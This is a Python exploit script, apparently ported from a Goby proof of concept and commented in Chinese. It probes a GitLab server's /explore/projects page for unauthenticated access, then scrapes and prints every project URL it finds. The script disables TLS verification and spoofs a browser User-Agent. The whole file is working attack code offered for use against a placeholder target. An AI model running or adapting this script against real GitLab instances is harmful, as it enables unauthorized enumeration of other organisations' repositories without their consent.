#!/usr/bin/env python3

import requests
import re
from urllib.parse import urljoin


class GitLabUnauthorizedExploit:
    def __init__(self, target_url):
        """
        初始化利用类
        :param target_url: 目标GitLab地址，如 http://gitlab.example.com
        """
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36'
        })
        self.session.verify = False  # 对应Goby的VerifyTls = false
        requests.packages.urllib3.disable_warnings()

    def exploit(self):
        """
        执行漏洞利用
        :return: (success, output) 成功状态和输出结果
        """
        uri = "/explore/projects"
        url = urljoin(self.target_url, uri)

        try:
            # 发送GET请求，不跟随重定向
            response = self.session.get(url, allow_redirects=False)

            # 检查状态码
            if response.status_code != 200:
                return False, f"请求失败，状态码: {response.status_code}"

            # 按照原始逻辑解析HTML
            # 使用"<a "分割响应内容
            tags = response.text.split("<a ")

            slice_list = []
            for tag in tags:
                # 检查是否包含class="project"
                if 'class="project"' in tag:
                    # 查找href属性
                    href_index = tag.find('href="')
                    if href_index != -1:
                        # 提取href值
                        href_start = href_index + len('href="')
                        href_end_index = tag[href_start:].find('"')
                        if href_end_index != -1:
                            href = tag[href_start:href_start + href_end_index]
                            # 构建完整URL
                            full_url = urljoin(self.target_url, href)
                            slice_list.append(full_url)

            if slice_list:
                # 用", "连接所有URL
                result = ", ".join(slice_list)
                return True, result
            else:
                return False, "未找到项目信息"

        except Exception as e:
            return False, f"利用失败: {str(e)}"

    def scan(self):
        """
        漏洞检测
        :return: (is_vulnerable, output)
        """
        uri = "/explore/projects"
        url = urljoin(self.target_url, uri)

        try:
            response = self.session.get(url, allow_redirects=False)

            if response.status_code == 200:
                # 检查响应中是否不包含特定字符串
                if "Explore public groups to find projects to contribute to" not in response.text:
                    return True, "目标可能存在漏洞"
                else:
                    return False, "需要认证访问"
            else:
                return False, f"请求失败，状态码: {response.status_code}"

        except Exception as e:
            return False, f"检测失败: {str(e)}"


def main():
    # 配置参数
    target = "http://target.com"  # 替换为目标地址
    filepath = "/explore/projects"  # 对应ExpParams中的filepath参数

    print(f"[*] 目标: {target}")
    print(f"[*] 利用路径: {filepath}")
    print("[*] 开始检测漏洞...")

    # 创建利用对象
    exploit = GitLabUnauthorizedExploit(target)

    # 先进行漏洞检测（对应ScanSteps）
    is_vul, scan_output = exploit.scan()
    if not is_vul:
        print(f"[-] 漏洞检测结果: {scan_output}")
        return

    print(f"[+] 漏洞检测通过: {scan_output}")
    print("[*] 开始执行漏洞利用...")

    # 执行漏洞利用（对应ExploitSteps）
    success, output = exploit.exploit()

    if success:
        print("\n[+] ========== 利用成功 ==========")
        print(f"[+] 获取到的项目列表:\n{output}")
        print("[+] =============================")
    else:
        print(f"\n[-] 利用失败: {output}")


if __name__ == "__main__":
    main()
